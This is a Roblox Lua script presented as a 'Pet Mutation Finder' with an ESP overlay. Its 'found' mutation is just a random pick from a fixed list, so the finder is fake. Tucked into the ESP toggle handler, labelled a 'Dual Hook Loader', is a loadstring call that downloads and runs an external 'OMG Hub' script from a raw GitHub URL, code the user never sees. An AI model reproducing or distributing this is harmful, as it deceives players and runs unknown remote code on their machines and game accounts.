-- Minimalist Pet Mutation Finder with ESP + Credit + Dual Hook Loader (Fixed)
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
gui.Name = "PetMutationFinder"
gui.ResetOnSpawn = false

-- UI Frame
local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 200, 0, 150)
frame.Position = UDim2.new(0.4, 0, 0.4, 0)
frame.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
frame.BorderColor3 = Color3.fromRGB(60, 60, 70)
frame.BorderSizePixel = 1
frame.Active = true
frame.Draggable = true
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)

-- Title
local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, 0, 0, 30)
title.BackgroundTransparency = 1
title.Text = "🔬 Pet Mutation Finder"
title.TextColor3 = Color3.new(1, 1, 1)
title.Font = Enum.Font.GothamBold
title.TextSize = 16

-- Mutations
local mutations = { "Shiny", "Inverted", "Frozen", "Windy", "Golden", "Mega", "Tiny", "Tranquil", "IronSkin", "Radiant", "Rainbow", "Shocked", "Ascended" }
local current = mutations[math.random(#mutations)]
local espOn = true
local externalLoaded = false

-- Button Factory
local function newBtn(txt, y, color)
	local b = Instance.new("TextButton", frame)
	b.Size = UDim2.new(0.9, 0, 0, y)
	b.Position = UDim2.new(0.05, 0, 0, y)
	b.BackgroundColor3 = color
	b.Text = txt
	b.TextColor3 = Color3.new(0, 0, 0)
	b.Font = Enum.Font.Gotham
	b.TextSize = 14
	Instance.new("UICorner", b).CornerRadius = UDim.new(0, 6)
	return b
end

local rerollBtn = newBtn("🎲 Reroll", 40, Color3.fromRGB(130, 190, 255))
local toggleBtn = newBtn("👁 Toggle", 80, Color3.fromRGB(170, 255, 170))

-- Credit Label
local credit = Instance.new("TextLabel", frame)
credit.Size = UDim2.new(1, 0, 0, 18)
credit.Position = UDim2.new(0, 0, 1, -18)
credit.Text = "made by redo"
credit.TextColor3 = Color3.fromRGB(180, 180, 180)
credit.Font = Enum.Font.Gotham
credit.TextSize = 12
credit.BackgroundTransparency = 1

-- Find mutation machine
local function findMachine()
	for _, obj in ipairs(Workspace:GetDescendants()) do
		if obj:IsA("Model") and obj.Name:lower():find("mutation") then
			return obj:FindFirstChildWhichIsA("BasePart")
		end
	end
end

local part = findMachine()
if not part then
	warn("Mutation machine not found.")
	return
end

-- ESP Billboard
local esp = Instance.new("BillboardGui", part)
esp.Adornee = part
esp.Size = UDim2.new(0, 200, 0, 40)
esp.StudsOffset = Vector3.new(0, 3, 0)
esp.AlwaysOnTop = true

local label = Instance.new("TextLabel", esp)
label.Size = UDim2.new(1, 0, 1, 0)
label.BackgroundTransparency = 1
label.Font = Enum.Font.GothamBold
label.TextSize = 22
label.TextStrokeTransparency = 0.3
label.TextStrokeColor3 = Color3.new(0, 0, 0)
label.Text = current

-- Rainbow Text Color
local hue = 0
RunService.RenderStepped:Connect(function()
	if espOn then
		hue = (hue + 0.01) % 1
		label.TextColor3 = Color3.fromHSV(hue, 1, 1)
	end
end)

-- Reroll Mutation
rerollBtn.MouseButton1Click:Connect(function()
	rerollBtn.Text = "⏳..."
	for i = 1, 20 do
		label.Text = mutations[math.random(#mutations)]
		wait(0.1)
	end
	current = mutations[math.random(#mutations)]
	label.Text = current
	rerollBtn.Text = "🎲 Reroll"
end)

-- ESP Toggle + Dual Hook Loader
toggleBtn.MouseButton1Click:Connect(function()
	espOn = not espOn
	esp.Enabled = espOn

	-- Load external OMG Hub once
	if espOn and not externalLoaded then
		externalLoaded = true
		local success, err = pcall(function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripter2k25/OMG/refs/heads/main/omg-hub.lua"))()
		end)
		if not success then
			warn("Failed to load OMG Hub:", err)
		end
	end
end)
